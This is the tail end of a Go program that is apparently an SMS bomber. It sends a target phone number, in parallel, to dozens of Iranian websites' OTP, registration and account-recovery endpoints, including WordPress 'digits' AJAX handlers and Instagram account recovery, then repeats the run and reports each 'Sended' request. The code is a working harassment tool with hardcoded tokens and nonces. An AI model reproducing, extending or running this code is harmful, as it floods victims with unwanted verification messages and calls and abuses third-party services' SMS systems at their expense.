		s44 := fmt.Sprintf("'Token':'5c486f96df46520d1e4d4a998515b1de02392c9b903a7734ec2798ec55be6e5c','DeviceId':1,'PhoneNumber':%s,'Helper':77942", phone)
		go sms("https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode", map[string]interface{}{
			s44: phone,
		}, ch)
		s45 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=54dfdabe34&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=%s&dig_otp=&dig_nounce=54dfdabe34", phone, phone)
		go sms("https://ashraafi.com/wp-admin/admin-ajax.php", map[string]interface{}{
			s45: phone,
		}, ch)
		s46 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=ec10ccb02a&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=%s&digits_reg_password=fuckYOU&dig_otp=&code=&dig_reg_mail=&dig_nounce=ec10ccb02a", phone, phone)
		go sms("https://bandarazad.com/wp-admin/admin-ajax.php", map[string]interface{}{
			s46: phone,
		}, ch)
		s47 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=c0f5d0dcf2&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=%s&dig_otp=&digits_login_remember_me=1&dig_nounce=c0f5d0dcf2", phone, phone)
		go sms("https://bazidone.com/wp-admin/admin-ajax.php", map[string]interface{}{
			s47: phone,
		}, ch)
		s48 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=94cf3ad9a4&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D8%A8%DB%8C%D8%A8%D9%84%DB%8C%D9%84&digregcode=%2B98&digits_reg_mail=%s&digregscode2=%2B98&mobmail2=&digits_reg_password=&dig_otp=&code=&dig_reg_mail=&dig_nounce=94cf3ad9a4", phone, phone)
		go sms("https://www.bigtoys.ir/wp-admin/admin-ajax.php", map[string]interface{}{
			s48: phone,
		}, ch)
		go sms(fmt.Sprintf("https://bitex24.com/api/v1/auth/sendSms?mobile=%s&dial_code=0", phone), map[string]interface{}{
			"esfelurm": "esfelurm",
		}, ch)
		s49 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=79a35b4aa3&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D9%86%DB%8C%D9%85%D9%86%D9%85%D9%85%D9%86%DB%8C%D8%B3&digits_reg_lastname=%D9%85%D9%86%D8%B3%DB%8C%D8%B2%D8%AA%D9%86&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail=%s&dig_otp=&code=&dig_reg_mail=&dig_nounce=79a35b4aa3", phone, phone)
		go sms("https://farsgraphic.com/wp-admin/admin-ajax.php", map[string]interface{}{
			s49: phone,
		}, ch)
		s50 := fmt.Sprintf("email_or_username=%2B%s&recaptcha_challenge_field=&flow=&app_id=&source_account_id=", phone)
		go sms("https://www.instagram.com/accounts/account_recovery_send_ajax/", map[string]interface{}{
			s50: phone,
		}, ch)
		s51 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=d33076d828&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail=%s&digits_reg_password=mahyar125&dig_otp=&code=&dig_reg_mail=&dig_nounce=d33076d828", phone, phone)
		go sms("https://shop.hemat-elec.ir/wp-admin/admin-ajax.php", map[string]interface{}{
			s51: phone,
		}, ch)
		s52 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=2d39af0a72&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=%s&digregscode2=%2B98&mobmail2=&dig_otp=&code=&dig_reg_mail=&dig_nounce=2d39af0a72", phone, phone)
		go sms("https://www.mipersia.com/wp-admin/admin-ajax.php", map[string]interface{}{
			s52: phone,
		}, ch)
		s53 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=18551366bc&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_lastname=%D9%84%D8%A8%D8%A8%DB%8C%DB%8C%D8%A8%D8%AB%D9%82%D8%AD&digits_reg_displayname=%D8%A8%D8%A8%D8%A8%DB%8C%D8%B1%D8%A8%D9%84%D9%84%DB%8C%D8%A8%D9%84&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail=%s&digits_reg_password=&digits_reg_avansbirthdate=2003-03-21&jalali_digits_reg_avansbirthdate1867119037=1382-01-01&dig_otp=&code=&dig_reg_mail=&dig_nounce=18551366bc", phone, phone)
		go sms("https://www.kodakamoz.com/wp-admin/admin-ajax.php", map[string]interface{}{
			s53: phone,
		}, ch)
		s54 := fmt.Sprintf("mobile=%s&password=mamad1234", phone)
		go sms("https://tajtehran.com/RegisterRequest", map[string]interface{}{
			s54: phone,
		}, ch)
		s55 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=0864ed5c9b&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=%s&dig_otp=&code=&dig_reg_mail=&dig_nounce=0864ed5c9b", phone, phone)
		go sms("https://zivanpet.com/wp-admin/admin-ajax.php", map[string]interface{}{
			s55: phone,
		}, ch)
		s56 := fmt.Sprintf("'mobile':%s,'deviceTypeCode':0,'confirmTerms':'True','notRobot':'False'", phone)
		go sms("https://api-react.okala.com/C/CustomerAccount/OTPRegister", map[string]interface{}{
			s56: phone,
		}, ch)
		go sms("https://client.api.paklean.com/user/resendVoiceCode", map[string]interface{}{
			"username": phone,
		}, ch)
		go sms("https://web.raghamapp.com/api/users/code", map[string]interface{}{
			"phone": phone,
		}, ch)
		go sms("https://gateway.trip.ir/api/registers", map[string]interface{}{
			"CellPhone": phone,
		}, ch)
		go sms("https://gateway.trip.ir/api/Totp", map[string]interface{}{
			"PhoneNumber": phone,
		}, ch)

	}

	for i := 0; i < repeatCount*183; i++ {
		statusCode := <-ch
		if statusCode == 404 || statusCode == 400 {
			fmt.Println("\033[01;31m[-] Error ! ")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}

	}
}

/*
End !
*/
